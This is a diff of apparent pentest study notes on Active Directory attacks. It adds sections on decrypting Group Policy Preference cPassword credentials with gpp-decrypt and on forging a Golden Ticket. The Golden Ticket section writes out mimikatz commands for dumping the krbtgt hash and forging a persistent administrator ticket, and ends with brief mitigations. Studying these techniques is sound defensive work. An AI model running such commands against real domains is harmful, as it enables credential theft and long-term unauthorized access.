@@ -228,25 +228,46 @@ use strong passwords
 apply least privileges
 
 ---
-## smbrelay attack
+## GPP attack
 ### idea
+Group Pilicy Preference allowsa admins to create policies with embeded creds
+
+creds are ebcrypted and called cPassword
+
 ### tools
+gpp-decrypt cPassword
 ### reproduce
+[logo]: img/gpp.png
+![alt text](img/gpp.png "gpp")
+### payoff
+get a valid vreds and use them on more beneficial scenarios
 ### metigation
+update your system
 
 ---
-## smbrelay attack
+## Golden Ticket
 ### idea
-### tools
-### reproduce
-### metigation
+if we have a access to active directory domain controller with a creds of one of administrative group creds
 
----
-## smbrelay attack
-### idea
+we can create a ticket/certificate  for ourselves for persistent login 
+> actually it remains 10 years
+once we are in we abuse krbtgt user which a user reponsible for ticket creation and creat oursleves one
 ### tools
+mimicatz
+>privilege::debug
+
+>lsadump::lsa /inject /user:krbtgt
+
+>kerberos::golden /user:administrator /domain:tshoot.com /sid:  S-1-5-32-1045337234-12924708993-5683276719-19000 /krbtgt:d125e4f69c851529045ec95ca80fa37e /id:500 /ptt
+
 ### reproduce
+[logo]: img/last.png
+![alt text](img/last.png "golden")
+### payoff
+persistent login for 10 yesrs 
 ### metigation
+Enforce a least privilege model
+Install endpoint protection to block attackers from loading modules like mimikatz
 
 
 
